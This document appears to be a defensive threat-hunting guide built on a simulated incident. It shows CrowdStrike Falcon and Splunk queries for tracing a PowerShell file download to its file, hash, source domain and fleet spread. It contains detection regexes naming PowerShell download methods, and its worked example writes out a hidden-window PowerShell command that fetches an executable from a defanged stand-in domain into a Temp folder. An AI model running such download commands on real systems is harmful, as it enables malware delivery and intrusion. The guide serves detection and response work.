> **Lab scenario and templates.** The incident below is simulated, with invented hosts, users, hashes and documentation-range IPs. The queries are templates: Falcon field names, event availability and Splunk field names vary by sensor version, policy and log pipeline. Test each one on a short time range in your own environment before relying on it. No employer data is included.

## 1. The question

An alert says PowerShell reached out to the internet on a workstation. Before deciding how serious it is, you need four answers:

1. **What file did it fetch or drop?** (name and path)
2. **What is its hash?** (so you can check intel and search the fleet)
3. **Where did it come from?** (URL, domain, IP)
4. **Who else is affected?** (other hosts that ran or wrote the same thing)

CrowdStrike Falcon answers the first three from endpoint telemetry. Splunk network logs (proxy, firewall, DNS) answer the fourth, and confirm the first three from the network side.

### A note on "FQL"
In everyday talk, analysts call Falcon queries "FQL". Strictly, **Falcon Query Language (FQL)** is the filter syntax used by the Falcon API and in console filters, for example `hostname:'WS-031*'`. The **Advanced Event Search** page uses the **LogScale query language**, and that is what the hunting queries below use. Both are useful: LogScale queries to hunt events, FQL filters to select hosts when you automate.

## 2. The event simple names that matter

In Advanced Event Search, `#event_simpleName` selects the kind of telemetry. These are the ones I reach for in a PowerShell download investigation:

| Event simple name | What it tells you | Key fields |
|---|---|---|
| `ProcessRollup2` | A process started | `FileName`, `ImageFileName`, `CommandLine`, `SHA256HashData`, `ParentBaseFileName`, `TargetProcessId`, `ParentProcessId`, `UserName` |
| `SyntheticProcessRollup2` | A process that was already running when the sensor started | Same fields as above |
| `NewExecutableWritten` | An executable file was written to disk | `TargetFileName`, `SHA256HashData`, writing process (`ContextProcessId`) |
| `NewScriptWritten` | A script file was written to disk | `TargetFileName`, `SHA256HashData`, writing process |
| `DnsRequest` | A DNS lookup | `DomainName`, `ContextProcessId` |
| `NetworkConnectIP4` / `NetworkConnectIP6` | An outbound connection | `RemoteAddressIP4`, `RemotePort`, `ContextProcessId` |
| `CommandHistory` | Commands typed in an interactive console | `CommandHistory`, `ContextProcessId` |
| `ScheduledTaskRegistered` | A scheduled task was created | `TaskName`, `TaskExecCommand` |
| `AsepValueUpdate` | An autostart registry value changed | `RegObjectName`, `RegStringValue` |

Two fields connect everything:
- **`aid`** identifies the host (sensor).
- **`TargetProcessId`** on a `ProcessRollup2` event equals **`ContextProcessId`** on the DNS, network and file events that process generated, and equals **`ParentProcessId`** on its children. Always match them together with `aid`.

## 3. Step 1: Find PowerShell downloading something, and extract the URL

```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^(powershell|pwsh)\.exe$/i
| CommandLine=/(downloadstring|downloadfile|downloaddata|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer|net\.webclient|system\.net\.http|curl)/i
| CommandLine=/(?<source_url>https?:\/\/[^\s"'`)]+)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, SHA256HashData, source_url, CommandLine], limit=200)
| sort(@timestamp, order=desc)
```
The second filter pulls the URL out of the command line into a `source_url` field. If the command line was encoded (`-enc`), the URL won't be visible. Decode the base64 (UTF-16LE) to read it, and hunt encoded commands separately:

```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^(powershell|pwsh)\.exe$/i
| CommandLine=/\s-e(nc|ncodedcommand)?\s+[A-Za-z0-9+\/=]{40,}/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, CommandLine])
```

**False positives:** software deployment, monitoring agents and admin scripts that legitimately download. Allowlist by parent process, URL domain and host group after you confirm them.

## 4. Step 2: Is the PowerShell binary itself legitimate?

Attackers copy, rename or run PowerShell from odd places. Check the path and the hash of the process, not only its name.

**PowerShell running from a non-standard location:**
```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^(powershell|pwsh)\.exe$/i
| not ImageFileName=/\\(Windows\\(System32|SysWOW64)\\WindowsPowerShell\\v1\.0|Program Files\\PowerShell\\\d+)\\(powershell|pwsh)\.exe$/i
| table([@timestamp, ComputerName, UserName, ImageFileName, SHA256HashData, CommandLine, ParentBaseFileName])
```

**Stack the hashes of PowerShell across the fleet.** Legitimate builds produce a small set of hashes. A rare one is worth a look:
```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^(powershell|pwsh)\.exe$/i
| groupBy([SHA256HashData], function=[count(aid, distinct=true, as=hosts), min(@timestamp, as=first_seen), collect([ImageFileName])])
| sort(hosts, order=asc)
```

**A renamed copy of PowerShell.** Take the known-good hashes from the query above, then look for those hashes running under a different name:
```
#event_simpleName=ProcessRollup2 event_platform=Win
| in(SHA256HashData, values=["<known powershell sha256 1>", "<known powershell sha256 2>"])
| not FileName=/^(powershell|pwsh)\.exe$/i
| table([@timestamp, ComputerName, UserName, FileName, ImageFileName, CommandLine])
```

## 5. Step 3: What files did PowerShell write? (name, path and hash)

```
#event_simpleName=NewExecutableWritten event_platform=Win
| ContextBaseFileName=/^(powershell|pwsh)\.exe$/i
| table([@timestamp, ComputerName, UserName, TargetFileName, SHA256HashData, ContextProcessId])
| sort(@timestamp, order=desc)
```
Scripts are separate:
```
#event_simpleName=NewScriptWritten event_platform=Win
| TargetFileName=/\.(ps1|vbs|js|bat|cmd|hta)$/i
| TargetFileName=/\\(Users|ProgramData|Windows\\Temp)\\/i
| table([@timestamp, ComputerName, ContextBaseFileName, TargetFileName, SHA256HashData])
```
Executables dropped into `AppData`, `Temp`, `ProgramData` or `Users\Public` by PowerShell deserve attention. Record the **file name, full path and SHA256** for each, since those become your indicators.

If the file was saved with `-OutFile` or `DownloadFile`, the destination is often in the command line. Extract it:
```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^(powershell|pwsh)\.exe$/i
| CommandLine=/-outfile\s+["']?(?<out_file>[^\s"']+)/i
| table([@timestamp, ComputerName, out_file, CommandLine])
```

## 6. Step 4: Where did it come from?

**DNS lookups made by PowerShell:**
```
#event_simpleName=DnsRequest event_platform=Win
| ContextBaseFileName=/^(powershell|pwsh)\.exe$/i
| groupBy([DomainName], function=[count(aid, distinct=true, as=hosts), count(as=lookups), min(@timestamp, as=first_seen)])
| sort(hosts, order=asc, limit=100)
```
Domains contacted by only one or two hosts are the interesting ones.

**Outbound connections to public addresses:**
```
#event_simpleName=NetworkConnectIP4 event_platform=Win
| ContextBaseFileName=/^(powershell|pwsh)\.exe$/i
| not cidr(RemoteAddressIP4, subnet=["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"])
| groupBy([RemoteAddressIP4, RemotePort], function=[count(aid, distinct=true, as=hosts), count(as=connections)])
| sort(hosts, order=asc, limit=100)
```
If the domain isn't in the command line, DNS plus the connection event gives you the source. Together with the URL from step 1, you now have **domain, IP and full URL**.

## 7. Step 5: One timeline per suspicious process (advanced)

Rather than copy process IDs between queries, build a shared key and group by it. Treat this as a pattern to validate:
```
(#event_simpleName=ProcessRollup2 or #event_simpleName=NewExecutableWritten
 or #event_simpleName=DnsRequest or #event_simpleName=NetworkConnectIP4)
| case {
    #event_simpleName=ProcessRollup2 | pid := TargetProcessId ;
    * | pid := ContextProcessId
  }
| groupBy([aid, pid], function=[
    min(@timestamp, as=first_seen),
    collect([ComputerName, FileName, CommandLine, TargetFileName, SHA256HashData, DomainName, RemoteAddressIP4])
  ])
| CommandLine=/(downloadstring|downloadfile|invoke-webrequest|\biwr\b|\birm\b|net\.webclient)/i
```
Each result row is one process with its command line, the files it wrote (with hashes), the domains it resolved and the addresses it contacted.

## 8. Step 6: Scope the hash, file name and domain across the fleet

**Who ran or wrote this hash?**
```
(#event_simpleName=ProcessRollup2 or #event_simpleName=NewExecutableWritten)
| SHA256HashData="<sha256>"
| groupBy([ComputerName, #event_simpleName], function=[min(@timestamp, as=first_seen), collect([FileName, TargetFileName])])
| sort(first_seen, order=asc)
```
The earliest `first_seen` identifies patient zero.

**Who used the same file name?**
```
#event_simpleName=ProcessRollup2 event_platform=Win
| FileName=/^svc_update\.exe$/i
| groupBy([ComputerName, SHA256HashData], function=[count(as=runs), min(@timestamp, as=first_seen)])
```

**Who contacted the same domain?**
```
#event_simpleName=DnsRequest event_platform=Win
| DomainName=/cdn-verify\.example$/i
| groupBy([ComputerName, ContextBaseFileName], function=[count(as=lookups), min(@timestamp, as=first_seen)])
```
Different hashes sharing one file name, or one hash under several names, both suggest an actor reusing or rebuilding tooling.

## 9. Step 7: Confirm and extend in Splunk network traffic

Endpoint telemetry tells you what the host did. Network logs tell you what the whole environment saw, and cover hosts without a sensor. Field names below follow common CIM conventions. Adjust them to your data.

**Proxy: who requested the URL or domain?**
```
index=proxy earliest=-7d (url="*cdn-verify.example*" OR dest_host="cdn-verify.example")
| stats count min(_time) as first max(_time) as last values(http_user_agent) as user_agent
        sum(bytes_out) as bytes_out sum(bytes_in) as bytes_in by src_ip, user, url
| convert ctime(first) ctime(last)
```
A large `bytes_in` on the first request is the download. A large `bytes_out` later may indicate exfiltration.

**Proxy: PowerShell's own User-Agent.** `Invoke-WebRequest` and `Invoke-RestMethod` normally send a User-Agent containing `WindowsPowerShell`:
```
index=proxy earliest=-7d http_user_agent="*WindowsPowerShell*"
| stats count dc(src_ip) as hosts values(url) as urls by dest_host
| sort - count
```

**Proxy: requests with no User-Agent.** `System.Net.WebClient`, used by `DownloadString` and `DownloadFile`, typically sends none unless the script sets one:
```
index=proxy earliest=-7d
| where isnull(http_user_agent) OR http_user_agent="" OR http_user_agent="-"
| stats count dc(src_ip) as hosts values(url) as urls by dest_host
| where hosts<=2
| sort - count
```

**Firewall: what did the suspect host talk to?**
```
index=firewall earliest=-7d src_ip="10.1.2.31" dest_ip="203.0.113.77"
| stats count sum(bytes_out) as bytes_out sum(bytes_in) as bytes_in min(_time) as first max(_time) as last
        by src_ip, dest_ip, dest_port, action
| convert ctime(first) ctime(last)
```

**DNS: who resolved the domain, and to what?**
```
index=dns earliest=-7d query="*cdn-verify.example"
| stats count min(_time) as first values(answer) as resolved_ips by src_ip, query
| convert ctime(first)
```

**CIM data model version, fast across large data:**
```
| tstats summariesonly=false count min(_time) as first from datamodel=Web
    where Web.dest="*cdn-verify.example*"
    by Web.src, Web.dest, Web.url, Web.http_user_agent
| convert ctime(first)
```

**Joining Falcon and Splunk.** Falcon network events carry the host's local address (`LocalAddressIP4`). Use it with the event time to identify the matching `src_ip` in Splunk, keeping DHCP changes in mind. In the other direction, take every `src_ip` that Splunk shows contacting the indicator and search Falcon for those hosts.

## 10. Worked example (synthetic)

| Question | Answer | Source |
|---|---|---|
| What ran? | `powershell.exe -w hidden -c "iwr hxxps://cdn-verify[.]example/u -OutFile $env:LOCALAPPDATA\Temp\svc_update.exe"` | `ProcessRollup2` |
| Parent | `explorer.exe` (user-launched) | `ProcessRollup2` |
| File dropped | `C:\Users\asmith\AppData\Local\Temp\svc_update.exe` | `NewExecutableWritten` |
| Hash | `SHA256: 9f2c…e41a` (placeholder) | `NewExecutableWritten` |
| Domain | `cdn-verify[.]example` | `DnsRequest` |
| IP | `203.0.113.77:443` | `NetworkConnectIP4` |
| Network confirmation | Proxy shows 1.2 MB downloaded at 13:20:51, user agent `WindowsPowerShell`, then a 6 MB upload at 13:21:40 | Splunk proxy |
| Scope | The hash appears on 2 hosts, the domain was resolved by 3 | Falcon scoping queries |

From here: contain the affected hosts, submit the hash to your intel and sandbox tools, block the domain and IP, and review the three users' sign-ins.

## 11. Triage checklist

1. Record the **full command line** and decode anything encoded.
2. Record **file name, full path and SHA256** of every file written.
3. Record **URL, domain and IP**, and when each first appeared.
4. Check the **parent process**: `explorer.exe`, Office, a browser or a scheduled task each tell a different story.
5. Search the hash, file name and domain across the fleet.
6. Confirm in proxy, firewall and DNS logs, and size the transfer in both directions.
7. Check persistence: scheduled tasks and autostart registry changes.

## 12. Limits and tuning

- Not every download uses PowerShell. `curl`, `bitsadmin`, `certutil` and browsers can do the same, so widen the process filter once you have the pattern.
- A script that downloads, runs in memory and never writes a file leaves no `NewExecutableWritten`. The command line, DNS and network events still show it.
- Legitimate automation looks similar. Build allowlists from confirmed results and review them regularly.
- HTTPS hides the URL path from network logs unless a proxy inspects TLS. The Falcon command line may be your only record of the full URL.

## 13. Key takeaways

1. Use event types in layers: `ProcessRollup2` for the command, file events for name and hash, `DnsRequest` and `NetworkConnectIP4` for the source.
2. Join everything on `aid` plus the process ID, and keep the process as your unit of analysis.
3. Capture **name, path, hash, URL, domain and IP** every time. They are your indicators and your scoping keys.
4. Use Splunk network logs to confirm the download, measure the transfer and find hosts without a sensor.
5. Validate every query in your own environment first.
